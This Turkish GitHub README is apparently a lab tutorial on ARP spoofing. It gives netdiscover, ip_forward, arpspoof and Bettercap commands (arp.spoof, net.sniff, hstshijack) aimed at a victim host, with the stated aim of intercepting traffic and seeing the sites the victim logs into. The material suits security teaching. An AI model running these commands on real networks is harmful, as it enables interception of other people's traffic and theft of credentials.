# ARP-Spoofing
ARP Spoofing nedir ? Wireshark ve Bettercap ile uygulamalı nasıl yapılabilir?

**Author : By Hamza Erten**

## ARP Spoofing nedir ?
ARP, IP adresini MAC adresiyle ilişkilendirmek için kullanılan bir protokoldür. Ağda IP çakışmasını önlemek ve bağlantıları herhangi bir şekilde engellemek ya da durdurmak için kullanılmaktadır. Kimlik doğrulama eksikliği nedeniyle ARP, siber saldırılar açısından güvenlik açığı yaratmakta, saldırganların hassas verilere yetkisiz erişim sağlamasına yol açmaktadır.

ARP spoofing saldırılarında siber suçluların MAC adresi bir IP adresine bağlandığında, saldırgan meşru MAC adresine yönlendirilen herhangi bir mesajı alabilir, değiştirebilir veya engelleyebilir.

![arpspoofing](https://github.com/hmzart/ARP-Spoofing/assets/103367369/cda5e2a2-9345-49e4-947d-a333bf14479a)

## Wireshark ile arp spoofing adım adım 
# 1. adım 
* `ifconfig` komutunu kullanıp kendi ip adresimizi öğreniyoruz .
  
  ![ifconfig komutu](https://github.com/hmzart/ARP-Spoofing/assets/103367369/adaf7393-f8bc-41b5-bcb0-b43da3f1685d)

# 2.adım

* Belirlediğimiz kurban makinanın apisini öğrenmek için `netdiscover -i eth0 -r 10.0.2.0/24 -c 10` benim ip adresim 10.0.2.0 olduğu için girdiğim kodda 0 ila 255 arasında bulunan tüm ip lerin taranmasını sağlıyoruz.

![netdiscover komutu](https://github.com/hmzart/ARP-Spoofing/assets/103367369/cd0e219b-5ffe-4b6d-bd4d-dffa7d0af552)

* Burda 10.0.2.123 ip adresine saldırı yapılacağını anlıyoruz .

# 3. adım
  `echo 1> /proc/sys/net/ipv4/ip_forward    `  komutu ile saldırı yapılacak olan makinanın internet bağlantısının kesilmemesini sağladık.

![proc](https://github.com/hmzart/ARP-Spoofing/assets/103367369/04df024f-2af7-4c54-ac71-f1819f4540d5)

# 4. adım 
*Belirlediğim kurban makinenin ip sini ve kendi ip mizi bu şekilde    `arpspoof -i eth0 -t 10.0.2.123 10.0.2.1` , `arpspoof -i eth0 -t 10.0.2.1 10.0.2.123`  sırayla yazdıktan sonra ARP saldırısı başlar.
![arp 1](https://github.com/hmzart/ARP-Spoofing/assets/103367369/6836eefe-0de5-4f7d-b513-86f01dfccbe0)
![arp 2](https://github.com/hmzart/ARP-Spoofing/assets/103367369/12e4e696-de20-4a40-8256-92ecbac770a2)

# 5. adım 
* Kurban makineden test etmek isterseniz cmd yi çalıştırıp  `arp -a ` yazdığınızda ilk durumda MAC adreslerinin farklı saldırı gerçekleştirdikten sonra ise aynı olduğunu göreceksiniz!.
  
  ![win arp - a komutu](https://github.com/hmzart/ARP-Spoofing/assets/103367369/fadcfc9c-316e-4510-b9bd-0f2c3419489c)

# 6.adım
* Wireshark ile arp zehirlenmesini izleyebilirsiniz !
  ![wireshark arp görüntüsü](https://github.com/hmzart/ARP-Spoofing/assets/103367369/f94b43f9-f329-41d6-a79f-df32474408d0)

--- 
# Saldırıyı Bettercap ile takip etme 

## 1 . 
* `bettercap -iface et0 ` komutunu çalıştır daha sonra ` help` yaz.
![bettercap ilk komut](https://github.com/hmzart/ARP-Spoofing/assets/103367369/32628e02-3e57-43f6-86d9-9e7d7030ccab)
# 2. 
![btc help](https://github.com/hmzart/ARP-Spoofing/assets/103367369/8283f66d-c436-4056-9ace-cd03d46db4e0)

* `help net.probe`
*  `net.probe on`
*  `help arp.spoof`
  ---
  sırasıyla ;

*  `set arp.spoof.fullduplex true`
*  `set arp.spoof.internal true`
*  `set arp.spoof.targets 10.0.2.123`
*  ` arp.spoof on`
*   `net.sniff on`
   ## ve son olarak `help` çalıştırıp  aktif ettiklerimizi kontrol edelim . Son durum bu şekilde olmalı .
![help 2](https://github.com/hmzart/ARP-Spoofing/assets/103367369/650f9cc6-3dc7-4026-b725-efcdac35625b)

    
* `hstshijack/hstshijack ` komutu ile arp yi başlatabiliriz. fakat bir hata olursa `caplets.show ` ile dosya konumuna bakarak  hstshijack dosyalarını istenilen yere taşıyabiliriz .
* # 3.
  * Giriş yapmaya çalıştığı site hakkında bu şekil de  bilgi verir :
    ![log](https://github.com/hmzart/ARP-Spoofing/assets/103367369/c154f929-6b01-48ef-ac44-69c3b29fe5d1)
